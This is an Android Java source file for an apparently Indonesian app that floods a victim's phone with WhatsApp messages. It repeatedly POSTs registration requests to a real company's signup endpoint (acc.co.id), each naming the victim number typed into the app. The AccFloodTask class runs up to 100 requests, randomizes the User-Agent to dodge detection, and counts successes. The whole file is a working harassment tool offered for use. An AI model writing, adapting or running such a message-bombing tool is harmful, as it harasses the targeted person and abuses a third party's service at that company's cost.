package com.xyra.panel;

import android.app.Activity;
import android.os.AsyncTask; 
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

public class MainActivity extends Activity {

    private EditText etTargetPhone, etJumlahKirim;
    private Button btnStartFlood;
    private ProgressBar progressBar;
    private TextView tvStatus;

    private class AccFloodTask extends AsyncTask<String, Object, String> { 

        private int totalSuccesses = 0;
        private int totalFailures = 0;
        private long totalDurationMs = 0;
        private int totalKirim = 0;
        private final int DELAY_SECONDS = 3; 

        @Override
        protected void onPreExecute() {
        }

        @Override
        protected String doInBackground(String... params) {
            String targetPhone = params[0];
            totalKirim = Integer.parseInt(params[1]);

            String urlStr = "https://www.acc.co.id/register/new-account";
            String phoneWith0 = "0" + targetPhone;

            for (int i = 1; i <= totalKirim; i++) {
                if (isCancelled()) break;

                long startTime = System.currentTimeMillis();
                String statusMsg;

                HttpURLConnection conn = null;
                try {
                    JSONArray jsonArray = new JSONArray();
                    JSONObject payload = new JSONObject();
                    payload.put("user_id", JSONObject.NULL);
                    payload.put("action", "register");
                    payload.put("send_to", phoneWith0);
                    payload.put("provider", "whatsapp");
                    jsonArray.put(payload);

                    String jsonData = jsonArray.toString();

                    Random rand = new Random();
                    String userAgent = "Mozilla/5.0 (Android) Chrome/" + (rand.nextInt(25) + 100) + ".0.0.0 Safari/537.36";

                    URL url = new URL(urlStr);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(20000);
                    conn.setDoOutput(true);

                    conn.setRequestProperty("User-Agent", userAgent);
                    conn.setRequestProperty("Accept", "text/x-component");
                    conn.setRequestProperty("Content-Type", "text/plain");
                    conn.setRequestProperty("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7");
                    conn.setRequestProperty("Origin", "https://www.acc.co.id");
                    conn.setRequestProperty("Referer", "https://www.acc.co.id/register/new-account");
                    conn.setRequestProperty("sec-ch-ua-platform", "\"Android\"");

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;

                    if (responseCode == 200) {
                        totalSuccesses++;
                        statusMsg = "SUCCESS (200 OK) - " + duration + "ms";
                    } else {
                        totalFailures++;
                        statusMsg = "GAGAL (HTTP " + responseCode + ") - " + duration + "ms";
                    }

                } catch (Exception e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    statusMsg = "GAGAL (" + e.getMessage() + ") - " + duration + "ms";
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }

                int progress = (int) ((float) i / totalKirim * 100);
                publishProgress(progress, i, totalSuccesses, totalFailures, statusMsg);

                if (i < totalKirim) {
                    try {
                        Thread.sleep(DELAY_SECONDS * 1000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            return "Selesai";
        }

        @Override
        protected void onProgressUpdate(Object... values) { 
            progressBar.setProgress((Integer) values[0]);

            int current = (Integer) values[1];
            int suc = (Integer) values[2];
            int fail = (Integer) values[3];
            String msg = (String) values[4];

            tvStatus.setText("Status: " + msg + "\n" +
                             "Iterasi: " + current + "/" + totalKirim + 
                             " | Sukses: " + suc + " | Gagal: " + fail);
        }

        @Override
        protected void onPostExecute(String result) {
            progressBar.setVisibility(View.GONE);
            btnStartFlood.setEnabled(true);

            float avgTime = (totalKirim > 0) ? (float) totalDurationMs / totalKirim : 0;

            String summary = String.format(
                "Selesai!\nTotal: %d\nSukses: %d\nGagal: %d\nRata-rata: %.0f ms",
                totalKirim, totalSuccesses, totalFailures, avgTime
            );
            tvStatus.setText("Status: " + summary);
            Toast.makeText(MainActivity.this, "Proses Selesai!", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); 

        etTargetPhone = findViewById(R.id.et_target_phone);
        etJumlahKirim = findViewById(R.id.et_jumlah_kirim);
        btnStartFlood = findViewById(R.id.btn_start_flood);
        progressBar = findViewById(R.id.progress_bar);
        tvStatus = findViewById(R.id.tv_status);

        btnStartFlood.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    String targetPhone = etTargetPhone.getText().toString().trim();
                    String jumlahStr = etJumlahKirim.getText().toString().trim();

                    if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
                        Toast.makeText(MainActivity.this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    int jumlahKirim = Integer.parseInt(jumlahStr);
                    if (jumlahKirim < 1 || jumlahKirim > 100) {
                        Toast.makeText(MainActivity.this, "Jumlah harus antara 1-100!", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    btnStartFlood.setEnabled(false);
                    progressBar.setVisibility(View.VISIBLE);
                    tvStatus.setText("Status: Memulai proses...");

                    new AccFloodTask().execute(targetPhone, String.valueOf(jumlahKirim));

                } catch (NumberFormatException e) {
                    Toast.makeText(MainActivity.this, "Jumlah harus angka!", Toast.LENGTH_SHORT).show();
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    btnStartFlood.setEnabled(true);
                    progressBar.setVisibility(View.GONE);
                }
            }
        });
    }
}
